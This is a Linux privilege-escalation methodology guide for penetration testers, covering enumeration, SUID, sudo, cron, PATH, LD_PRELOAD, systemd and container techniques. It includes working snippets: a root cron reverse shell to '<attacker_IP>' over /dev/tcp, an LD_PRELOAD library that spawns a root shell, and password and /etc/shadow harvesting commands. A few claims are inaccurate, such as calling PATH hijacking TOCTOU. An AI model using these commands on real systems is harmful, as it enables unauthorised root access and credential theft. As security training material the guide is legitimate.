# LINUX PRIVILEGE ESCALATION: STEP-BY-STEP GUIDE

-------------------------------------------------------------------------------------------------

# Guiding Principle: Systematically exploring potential escalation paths or attack vectors, starting with the easiest and least intrusive.

# PHASE 1: BASIC SYSTEM ENUMERATION (Local Recon): Before Exploitation, you must get to know the environment, its essential in order to find potential escalation paths or attack vectors.

# 1.1. Basic User Information:

    - whoami: Determine the current user.
    - w: It's a system utility that displays information about users who are currently logged in to the system.
    - id: Display user ID (UID), group ID (GID), and group memberships.  This is *critical*.
    - groups: Show the groups the current user belongs to. This is *critical*.
    - last: Show the last login in the system

# 1.2. System Information:

    - uname -a : Kernel version and architecture.
    - cat /etc/issue : OS distribution and version.  (Check `/etc/os-release` if `/etc/issue` is not available).
    - lsb_release -a : More detailed distribution information (if `lsb-release` is installed).
    - hostname : Hostname.
    - arch: System architecture.
    - cat /proc/version: Kernel version details.

# 1.3. Network Configuration (Useful for potential lateral movement):

    - ifconfig / ip addr : Network interfaces and IP addresses.
    - route -n: Routing table.
    - netstat -antp / ss -antp: Listening ports and established connections (requires `sudo` or similar sometimes).
    - arp -a: ARP table.
    - cat /etc/hosts: Hosts file.
    - resolvectl status (if available): DNS information.

# 1.4. Environment Variables:

    - env: Display environment variables. Pay close attention to `PATH` and variables containing passwords or secrets.
    - set: Display shell variables.

# 1.5. Installed Software:

    - dpkg -l (Debian/Ubuntu): List installed packages.
    - rpm -qa (Red Hat/CentOS/Fedora): List installed packages.
    - yum list installed (Red Hat/CentOS/Fedora): List installed packages.
    - pacman -Q (Arch Linux): List installed packages.
    - apk list (Alpine Linux): List installed packages.
    - which <program_name>: Find the full path to a program (e.g., `which python`).
    - find / -name <program_name> 2>/dev/null : Find all instances of a program (e.g., `find / -name python 2>/dev/null`).  Use this if `which` fails or gives unexpected results.
    - locate <program_name> : Uses a database, so update the database first using `updatedb` (if permissions allow). Faster than `find` but may be outdated.
    - ps aux: List running processes.  Crucial for identifying interesting services and their users. `ps auxf` shows a tree-like view of processes.
    - systemctl list-units --type=service : List systemd services. Useful for identifying running daemons and their configurations.

# 1.6. File System Exploration:

    - ls -la / : List contents of the root directory.
    - find / -perm -4000 -user root 2>/dev/null : Find SUID binaries owned by root. *Critically important*.
    - find / -perm -2000 -group root 2>/dev/null : Find SGID binaries owned by group root.  *Critically important*.
    - find / -writable -type f 2>/dev/null : Find writable files.
    - find / -writable -type d 2>/dev/null : Find writable directories.
    - find / -perm -o+w -type f 2>/dev/null : Find world-writable files.
    - find / -perm -o+w -type d 2>/dev/null : Find world-writable directories.
    - find / -name "*.conf" 2>/dev/null: Find configuration files.
    - find / -name "*.log" 2>/dev/null : Find log files.
    - find / -name "*.sh" 2>/dev/null : Find shell scripts.
    - find / -name "*.py" 2>/dev/null : Find Python scripts.
    - find / -name "*backup*" 2>/dev/null : Find backup files.
    - find / -name "*password*" 2>/dev/null : Find files with "password" in the name.
    - grep -Ri "password" / : Search for passwords in files. *Use with caution - can be noisy*.  Consider using `grep -Ri --exclude-dir={/proc,/sys,/dev} "password" /` to exclude certain directories.
    - stat <file> : Get detailed information about a file (permissions, ownership, access times).
    - file <file> : Determine the file type (e.g., executable, script, text file).
    - cat /etc/passwd : List user accounts (look for accounts with UID 0 - these are root).
    - cat /etc/shadow : List password hashes (requires root privileges).  If readable, can be cracked offline.

# PHASE 2: EXPLOITATION TECHNIQUES (Ordered by Complexity)

# 2.1. Misconfigured SUID/SGID Binaries:  *High Priority*

    - Explanation: SUID (Set User ID) and SGID (Set Group ID) binaries execute with the privileges of the file owner or group, respectively.  Misconfigured SUID/SGID binaries are a common escalation path.

    - Enumeration: find / -perm -4000 -user root 2>/dev/null` (SUID root), `find / -perm -2000 -group root 2>/dev/null` (SGID root).
    
    - Exploitation:
        - *Use linux-exploit-suggester or LinPEAS. ONE OF "THE" most useful tools!*
        - Known Exploits: Search Exploit-DB and other resources for exploits specific to the identified SUID/SGID binaries (e.g., `searchsploit <binary_name>`).
        - GTFOBins: Check GTFOBins (https://gtfobins.github.io/) for ways to abuse common SUID/SGID binaries to gain elevated privileges.  GTFOBins provides command sequences for exploiting common binaries like `find`, `nmap`, `less`, `more`, `vim`, `awk`, `sed`, etc.
        - Example (find): If `find` has the SUID bit set, you can often use it to execute arbitrary commands as root:
            ```bash
            find . -exec /bin/sh -p \; -quit # -p preserves the environment, making escalation more likely
            ```
        - Example (nmap): If `nmap` has the SUID bit set, you can run arbitrary commands using the `--interactive` option or by crafting NSE scripts.
    - **Important Note:** Pay close attention to the `PATH` environment variable when exploiting SUID/SGID binaries.  A controlled `PATH` can allow you to execute malicious versions of system utilities.

# 2.2. Capabilities:  *High Priority*

    - Explanation: Linux capabilities provide a finer-grained privilege management system than SUID/SGID.  Capabilities allow a process to perform specific privileged operations without granting it full root privileges.
    - Enumeration: `getcap -r / 2>/dev/null` (Requires `libcap2-bin` on Debian-based systems).
    - Exploitation:
        - Identify Vulnerable Capabilities:  Commonly exploitable capabilities include `cap_setuid`, `cap_setgid`, `cap_sys_module`, `cap_dac_override`, `cap_net_raw`, `cap_net_bind_service`.  GTFOBins can also help identify exploits for binaries with specific capabilities.
        - Example (cap_setuid/cap_setgid): If a binary has `cap_setuid` or `cap_setgid`, you might be able to change the user or group ID to root and execute arbitrary commands.  GTFOBins often provides specific commands.
        - Example (cap_net_bind_service):  A binary with `cap_net_bind_service` can bind to privileged ports (ports < 1024).  This could be exploited if a service is expecting to connect to a specific port.
        - Searchsploit: Use `searchsploit` or online search engines with `capability privilege escalation`
    - **Important Note:** Capabilities can be added to individual files or to the process executing them.

# 2.3. Weak File Permissions:  *High Priority*

    - Explanation: World-writable files or directories can be modified by any user, potentially leading to privilege escalation.  Improperly secured configuration files can also expose sensitive information (passwords, API keys).
    - Enumeration:
        - find / -perm -o+w -type f 2>/dev/null : Find world-writable files.
        - find / -perm -o+w -type d 2>/dev/null : Find world-writable directories.
        - find / -writable -type f 2>/dev/null : Find writable files.
        - find / -writable -type d 2>/dev/null: Find writable directories.
    - Exploitation:
        - World-Writable Files (Direct Modification): If you find a world-writable executable script (e.g., a shell script), you can inject malicious code into the script. If that script is executed by a privileged user or process (e.g., via a cron job), you can gain elevated privileges.
        - World-Writable Directories (Path Manipulation): If you find a world-writable directory that is in the `PATH` of a privileged user or process, you can create a malicious executable with the same name as a system utility and potentially hijack the execution path.  This is a classic "TOCTOU" (Time-of-Check Time-of-Use) vulnerability.
        - Configuration Files (Credential Harvesting): Examine configuration files (`*.conf`, `*.ini`, etc.) for plaintext passwords, API keys, or other sensitive information.  Use `grep -Ri "password" /etc` and similar searches.
        - /etc/passwd Manipulation: *If* `/etc/passwd` is writable (highly unlikely but possible), you can add a new user with UID 0 (root).  This gives you immediate root access.  *Extremely rare*.

# 2.4. Kernel Exploits: *Medium to High Priority (but more complex)*

    - Explanation: Kernel vulnerabilities can allow arbitrary code execution with root privileges.
    - Enumeration: `uname -a` (kernel version).
    - Exploitation:
        - Search Exploit-DB: Search for kernel exploits specific to the identified kernel version (e.g., `searchsploit kernel 4.15.0`).
        - CVE Databases:  Search CVE databases (NVD, etc.) for known kernel vulnerabilities.
        - Metasploit: Metasploit may have kernel exploit modules.
        - Kernel Pwn Frameworks: Consider using specialized kernel exploitation frameworks (e.g., Linux Exploit Suggester) to identify potential vulnerabilities.  These tools analyze the kernel version and installed packages to suggest relevant exploits.  Some examples include:
            - linux-exploit-suggester.sh (LES):  A classic tool for suggesting kernel exploits.
            - kernelpop: A more modern kernel exploitation framework.
        - Compiling Exploits: Kernel exploits often require compilation. Make sure you have the necessary development tools (e.g., `gcc`, `make`, kernel headers). You may need to install kernel headers matching the target kernel:  `apt-get install linux-headers-$(uname -r)` or `yum install kernel-devel-$(uname -r)`.
        - Testing: *Absolutely critical*.  Test the exploit in a *controlled environment* (e.g., a virtual machine running the same kernel version) before deploying it against the real target. Kernel exploits can be unstable and may crash the system.
    - Important Notes:
        - **Kernel exploits are often architecture-specific (x86, x64, ARM).**
        - **Kernel exploits may require specific compiler flags and linker options.**
        - **Kernel exploits can be highly dependent on the target system's configuration.**
        - **Kernel exploits are generally considered high-risk and should be used with caution.**

# 2.5. Exploiting Scheduled Tasks (Cron Jobs): *Medium Priority*

    - Explanation: Cron jobs are scheduled tasks that run automatically. If you can modify a script executed by a cron job running as root, you can gain elevated privileges.
    - Enumeration:
        - cat /etc/crontab : System-wide crontab.
        - ls -la /etc/cron.d :  Directory containing cron job definitions.
        - ls -la /var/spool/cron : User-specific crontabs.
        - getfacl /etc/crontab : Check ACLs on the crontab file.
        - getfacl /etc/cron.d/* : Check ACLs on files in `/etc/cron.d`.
    - Exploitation:
        - Writable Cron Files: If you can modify `/etc/crontab` or files in `/etc/cron.d` (due to weak permissions or ACLs), you can add your own cron job to execute arbitrary commands as root.
        - **Writable Cron Scripts: If you find a cron job that executes a script that you can modify (due to weak file permissions on the script itself), you can inject malicious code into the script.
        - Race Conditions: In some cases, you can exploit race conditions in cron jobs. For example, if a cron job creates a temporary file, you might be able to create the file first with your own malicious content, before the cron job has a chance to create it with the intended content.
    - Example: If you can modify `/etc/crontab`, add a line like this to execute a reverse shell as root every minute:
        ```
        * * * * *  root /bin/bash -c "bash -i >& /dev/tcp/<attacker_IP>/<attacker_port> 0>&1"
        ```

# 2.6. Password Reuse and Cracking: *Medium Priority*

    - Explanation: Users often reuse passwords across multiple systems. If you obtain a password from another source (e.g., a previous engagement, a leaked database), you can try to use it to log in as a privileged user on the target system.
    - Techniques:
        - Password Spraying: Try using a small number of common passwords against multiple user accounts. This is less likely to lock out accounts than a full-blown brute-force attack.
        - Password Cracking: If you obtain password hashes (e.g., from `/etc/shadow` or a database dump), crack them using tools like `hashcat` or `John the Ripper`.
        - Known Credentials: If you have credentials from OSINT, previous penetration tests, or compromised systems, try those credentials first.
    - Example:
        - `john --wordlist=/usr/share/wordlists/rockyou.txt hashfile` (Crack password hashes with John the Ripper).

# 2.7. Exploiting PATH Environment Variable: *Medium Priority*

    - Explanation: The `PATH` environment variable specifies the directories that the system searches for executable files. If you can control the `PATH`, you can potentially hijack the execution path and execute malicious versions of system utilities.
    - Techniques:
        - Writable Directories in PATH: If you find a writable directory that is in the `PATH` of a privileged user or process, you can create a malicious executable with the same name as a system utility and potentially hijack the execution path.  This is a classic "TOCTOU" vulnerability.
        - Manipulating PATH in SUID/SGID Binaries: As mentioned earlier, when exploiting SUID/SGID binaries, pay close attention to the `PATH` environment variable.  A controlled `PATH` can allow you to execute malicious versions of system utilities.
    - Example:
        1. Create a malicious `ls` executable:
            ```bash
            echo '#!/bin/bash' > /tmp/ls
            echo 'echo "Malicious LS Executed!" && /bin/bash' >> /tmp/ls
            chmod +x /tmp/ls
            ```
        2. Add `/tmp` to the beginning of the `PATH`:
            ```bash
            export PATH=/tmp:$PATH
            ```
        3. Now, when you run `ls`, the malicious version in `/tmp` will be executed *if* the current user or a process is running with elevated privileges that uses the PATH variable.  This is more likely to be effective in the context of exploiting a SUID binary or a cron job.

# 2.8. Shared Libraries and LD_PRELOAD: *Medium Priority*

    - Explanation:  The `LD_PRELOAD` environment variable allows you to specify shared libraries that should be loaded *before* other libraries. This can be used to inject malicious code into running processes.
    - Techniques:
        - LD_PRELOAD Hijacking: Create a malicious shared library that overrides functions used by a target program.  Set `LD_PRELOAD` to the path of your malicious library, and then execute the target program.  The program will load your library first, allowing you to execute arbitrary code in the context of the target program.
        - SUID/SGID Exploitation with LD_PRELOAD:  LD_PRELOAD can be particularly effective when exploiting SUID/SGID binaries.  You can use it to hijack the execution of functions called by the SUID/SGID binary and gain elevated privileges.
    - Example:
        1. Create a malicious shared library (`evil.c`):
            ```c
            #include <stdio.h>
            #include <stdlib.h>

            __attribute__ ((constructor))
            void preload() {
                system("/bin/bash -p"); // Or any other command
            }
            ```
        2. Compile the library:
            ```bash
            gcc -shared -fPIC evil.c -o evil.so
            ```
        3. Set `LD_PRELOAD` and run the target program:
            ```bash
            export LD_PRELOAD=/path/to/evil.so
            ./target_program
            ```
        4. If `target_program` is a SUID binary, you will get a root shell.

# 2.9. Abusing SUDO Privileges: *High Priority if applicable*

    - Explanation: If the current user has sudo privileges, there may be ways to abuse those privileges to gain root access.
    - Enumeration: `sudo -l` (List sudo privileges).  This is *critical*.
    - Exploitation:
        - Unrestricted Commands: If the user can run *any* command with sudo, simply run `sudo /bin/bash` or `sudo su`.
        - Restricted Commands: If the user can run specific commands with sudo, look for ways to abuse those commands to gain root access.  GTFOBins is an invaluable resource here.
        - Example (vim): If the user can run `vim` with sudo, you can use `vim` to execute arbitrary commands:
            ```bash
            sudo vim
            :!/bin/bash
            ```
        - Example (nmap): If the user can run `nmap` with sudo, you can use `nmap`'s `--interactive` mode or NSE scripts to execute commands.
        - NOPASSWD: If a command is allowed with `NOPASSWD`, you don't need to enter a password to run it with sudo. This simplifies exploitation.

# 2.10. Systemd Exploitation: *Medium Priority*

    - Explanation: Systemd is a system and service manager for Linux. Vulnerabilities in systemd or misconfigurations in systemd unit files can be exploited for privilege escalation.
    - Techniques:
        - Writable Unit Files: If you can modify systemd unit files (e.g., `/etc/systemd/system/*.service`), you can change the `ExecStart` directive to execute arbitrary commands as root when the service is started or restarted.
        - Exploiting `Delegate=yes`: If a unit file has `Delegate=yes`, it means that the service is allowed to manage its own resources (e.g., create directories, modify files). This can potentially be exploited if the service is running as a privileged user.
        - Exploiting `DynamicUser=yes`: If a unit file has `DynamicUser=yes`, systemd will create a new, unprivileged user for the service. This is generally a security measure, but there may be ways to exploit it if the service interacts with other parts of the system.
        - Timers: Systemd timers are similar to cron jobs. If you can modify a timer unit file, you can schedule arbitrary commands to be executed as root.
        - Journalctl: `journalctl` is the systemd journal viewer. If you can write to the systemd journal, you might be able to inject malicious log messages that could be exploited by other services.
    - Enumeration:
        - systemctl list-units --type=service: List systemd services.
        - cat /etc/systemd/system/*.service: Examine systemd unit files.
        - systemctl status <service_name>: Get the status of a specific service.

# PHASE 3: ADVANCED AND BLEEDING-EDGE TECHNIQUES

# 3.1. Container Escapes: *High Priority if running in a container*

    - Explanation: If you're in a container (Docker, Kubernetes, etc.), escaping the container can give you access to the host system and potentially root privileges.
    - Techniques:
        - Docker Socket: The Docker socket (`/var/run/docker.sock`) allows you to control the Docker daemon. If you can access the Docker socket from within a container, you can create new containers, mount host directories, and potentially execute commands on the host.
        - Privileged Containers: Privileged containers have access to more host resources than unprivileged containers. If you're in a privileged container, you may be able to use `nsenter` or other tools to escape to the host.
        - Capabilities: Certain capabilities, such as `CAP_SYS_ADMIN`, can make it easier to escape a container.
        - cgroups: cgroups (control groups) are used to limit and isolate resources for containers. Vulnerabilities in cgroups can be exploited to escape the container.
        - Kernel Exploits: Kernel exploits can sometimes be used to escape containers.
        - Kubernetes: If running in Kubernetes, look for misconfigured RBAC (Role-Based Access Control) policies that could allow you to escalate privileges.
    - Tools:
        - Docker: `docker`, `nsenter`
        - Kubernetes: `kubectl`
    - **Important Note:** Container escape techniques are constantly evolving. Stay up-to-date with the latest research and exploits.

# 3.2. eBPF Exploitation: *Very Advanced*

    - Explanation: eBPF (extended Berkeley Packet Filter) is a powerful technology that allows you to run sandboxed code in the Linux kernel. Vulnerabilities in eBPF can be exploited to gain kernel-level privileges.
    - Challenges:
        - Requires deep understanding of the Linux kernel and eBPF internals.
        - Exploits are often complex and difficult to develop.
        - eBPF is constantly evolving, so exploits may become outdated quickly.
    - Techniques:
        - Exploiting JIT vulnerabilities: The eBPF JIT (Just-In-Time) compiler can introduce vulnerabilities that allow you to execute arbitrary code in the kernel.
        - Exploiting verifier bugs: The eBPF verifier is responsible for ensuring that eBPF programs are safe to run. Bugs in the verifier can be exploited to bypass security checks.
        - Side-channel attacks: eBPF can be used to perform side-channel attacks, such as Spectre and Meltdown.
    - Resources:
        - Research papers and presentations on eBPF security.
        - Kernel mailing lists and security forums.

# 3.3. Hardware-Based Attacks: *Extremely Advanced (Rarely Applicable in Penetration Tests)*

    - Explanation: Hardware-based attacks exploit vulnerabilities in the CPU or other hardware components to gain control of the system.
    - Examples:
        - Spectre and Meltdown: These attacks exploit speculative execution in modern CPUs to leak sensitive information from the kernel.
        - Rowhammer: This attack exploits DRAM chips to flip bits in memory, potentially allowing you to overwrite kernel data structures.
        - Cold Boot Attacks: This attack involves freezing the system's memory and then booting from another device to access the contents of memory.
    - Challenges:
        - Extremely difficult to exploit in a real-world scenario.
        - Require specialized knowledge and equipment.
        - Often require physical access to the system.
    - Ethical Considerations:
        - Hardware-based attacks can be destructive and may violate the terms of engagement.
        - Obtain explicit permission from the client before attempting any hardware-based attacks.


# GENERAL REMINDERS:

*   **Least Privilege:** Always try the least intrusive method first.
*   **Ethical Hacking Principles:** Stay within the scope of engagement.  Avoid unnecessary damage.
*   **Keep Learning:** The landscape of Linux security is constantly evolving.

This detailed note should serve as a comprehensive guide to Linux privilege escalation, covering a wide range of techniques from basic enumeration to advanced and bleeding-edge exploitation. Remember to adapt these techniques to the specific target environment and always prioritize ethical considerations. Good luck! Hope you got to learn something from it! 